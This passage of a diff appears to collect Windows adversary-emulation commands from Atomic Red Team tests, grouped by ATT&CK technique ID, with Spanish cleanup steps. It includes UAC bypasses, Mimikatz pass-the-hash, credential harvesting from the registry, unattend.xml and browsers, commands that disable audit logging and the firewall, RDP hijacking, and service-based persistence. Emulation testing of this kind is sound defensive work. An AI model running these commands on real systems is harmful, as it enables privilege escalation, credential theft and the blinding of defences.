+sdbinst.exe "AtomicShimx86.sdb"
+
+#Borrado
+sdbinst.exe -u "AtomicShimx86.sdb" >nul 2>&1
+
+
 T1546.012.md
-T1547.001.md
+
+################T1547.001.md################
+
+##Atomic Test #8 - Add persistance via Recycle bin
+
+reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
+
+#Borrado
+reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
+
+
 T1547.009.md
 T1547.010.md
 T1547.md
-T1548.002.md
-T1550.002.md
+
+################T1548.002.md################
+
+##Atomic Test #1 - Bypass UAC using Event Viewer (cmd)
+
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
+cmd.exe /c eventvwr.msc
+
+#Borrado
+reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
+
+##Atomic Test #3 - Bypass UAC using Fodhelper
+
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+#Borrado
+reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
+
+################T1550.002.md################
+
+##Atomic Test #1 - Mimikatz Pass the Hash
+
+mimikatz.exe "sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a"
+
 T1550.003.md
-T1552.001.md
-T1552.002.md
-T1552.004.md
-T1552.006.md
-T1555.003.md
-T1555.004.md
+
+################T1552.001.md################
+
+##Atomic Test #5 - Access unattend.xml
+
+type C:\Windows\Panther\unattend.xml
+type C:\Windows\Panther\Unattend\unattend.xml
+
+
+################T1552.002.md################
+
+##Atomic Test #1 - Enumeration for Credentials in Registry
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+##Atomic Test #2 - Enumeration for PuTTY Credentials in Registry
+
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+
+################T1552.004.md################
+
+##Atomic Test #1 - Private Keys
+
+dir c:\ /b /s .key | findstr /e .key
+
+################T1552.006.md################
+
+##Atomic Test #1 - GPP Passwords (findstr)
+
+findstr /S cpassword %logonserver%\sysvol\*.xml
+
+
+################T1555.003.md################
+
+##Atomic Test #3 - LaZagne - Credentials from Browser
+
+cd lazagne
+"LaZagne.exe" browsers
+
+################T1555.004.md################
+
+##Atomic Test #1 - Access Saved Credentials via VaultCmd
+
+vaultcmd /listcreds:"Windows Credentials"
+
 T1558.003.md
 T1559.002.md
-T1559.md
-T1560.001.md
+
+##Atomic Test #2 - Execute PowerShell script via Word DDE
+
+#Necesitamos el docx en la carpeta
+start "DDE_Document.docx"
+
+################T1559.md################
+
+##Atomic Test #1 - Cobalt Strike Artifact Kit pipe
+
+"namedpipes_executor.exe" --pipe 1
+
+##Atomic Test #2 - Cobalt Strike Lateral Movement (psexec_psh) pipe
+
+"namedpipes_executor.exe" --pipe 2
+
+##Atomic Test #5 - Cobalt Strike post-exploitation pipe (before 4.2)
+
+"namedpipes_executor.exe" --pipe 5
+
+################T1560.001.md################
+
+##Atomic Test #3 - Compress Data and lock with password for Exfiltration with winzip
+
+path=%path%;"C:\Program Files (x86)\winzip"
+mkdir .\tmp\victim-files
+cd .\tmp\victim-files
+echo "This file will be encrypted" > .\encrypted_file.txt
+"%ProgramFiles%\WinZip\winzip64.exe" -min -a -s "hello" archive.zip *
+dir
+
 T1562.001.md
-T1562.002.md
-T1562.004.md
+
+################T1562.002.md################
+
+##Atomic Test #4 - Impair Windows Audit Log Policy
+
+auditpol /set /category:"Account Logon" /success:disable /failure:disable
+auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+auditpol /set /category:"Detailed Tracking" /success:disable
+
+#Borrado
+auditpol /set /category:"Account Logon" /success:enable /failure:enable
+auditpol /set /category:"Detailed Tracking" /success:enable
+auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+
+################T1562.004.md################
+
+##Atomic Test #1 - Disable Microsoft Defender Firewall
+
+netsh advfirewall set currentprofile state off
+
+#Borrado
+netsh advfirewall set currentprofile state on >nul 2>&1
+
+##Atomic Test #18 - LockBit Black - Unusual Windows firewall registry modification -cmd
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
+
+#Borrado
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /f >nul 2>&1
+
 T1562.006.md
 T1562.009.md
 T1562.md
-T1563.002.md
+################T1563.002.md################
+
+##Atomic Test #1 - RDP hijacking
+
+query user
+sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
+net start sesshijack
+
+#Borrado
+sc.exe delete sesshijack >nul 2>&1
+
 T1564.001.md
 T1564.002.md
+################T1564.003.md################
+
+##Atomic Test #2 - Headless Browser Accessing Mockbin
+
+start "" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec
+
+#Borrado
+taskkill /im chrome /f
+
 T1564.004.md
 T1564.006.md
 T1564.md
-T1569.002.md
+################T1566.001################
+
+##Atomic Test #1 - Download Macro-Enabled Phishing Attachment
+
+$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+
+#Borrado
+#borrar el archivo descargado
+
+################T1569.002.md################
+
+##Atomic Test #2 - Use PsExec to execute a command on a remote host
+
+"PsExec.exe" \\localhost -u DOMAIN\Administrator -p P@ssw0rd1 -accepteula "C:\Windows\System32\calc.exe"
+
+##Atomic Test #5 - Use RemCom to execute a command on a remote host
+
+cd remcom
+"remcom.exe" \\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe
+
+##Atomic Test #6 - Snake Malware Service Create
+
+sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe" DisplayName= "WerFault Service" start= auto
+
 T1574.001.md
 T1574.002.md
-T1574.009.md
+
+################T1574.009.md################
+
+##Atomic Test #1 - Execution of program.exe as service with unquoted service path
+
+#necesitamos el archivo en la carpeta
+copy "WindowsServiceExample.exe" "C:\Program Files\windows_service.exe"
+copy "WindowsServiceExample.exe" "C:\program.exe"
+sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
+sc start "Example Service"
+
+#Borrado
+sc stop "Example Service" >nul 2>&1
+sc delete "Example Service" >nul 2>&1
+del "C:\Program Files\windows_service.exe" >nul 2>&1
+del "C:\program.exe" >nul 2>&1
+del "C:\Time.log" >nul 2>&1
+
 T1574.011.md
 T1614.001.md
 T1615.md
